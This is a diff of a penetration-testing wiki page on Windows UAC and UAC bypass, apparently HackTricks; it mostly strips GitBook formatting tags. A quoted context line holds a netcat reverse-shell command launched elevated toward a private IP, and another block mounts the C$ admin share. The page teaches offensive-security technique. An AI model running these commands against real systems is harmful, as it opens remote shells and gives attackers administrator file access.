@@ -17,7 +17,7 @@
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+
 
 ## UAC
 
@@ -25,9 +25,9 @@ Get Access Today:
 
 For more info about integrity levels:
 
-{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
+
 [integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
-{% endcontent-ref %}
+
 
 When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.
 
@@ -107,9 +107,9 @@ whoami /groups | findstr Level
 
 ## UAC bypass
 
-{% hint style="info" %}
+
 Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAS prompt appears
-{% endhint %}
+
 
 The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
 
@@ -134,9 +134,9 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).
 
-{% hint style="warning" %}
+
 **Looks like this trick isn't working anymore**
-{% endhint %}
+
 
 ```bash
 net use Z: \\127.0.0.1\c$
@@ -221,7 +221,7 @@ Consists on watching if an **autoElevated binary** tries to **read** from the **
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+
 
 <details>
 
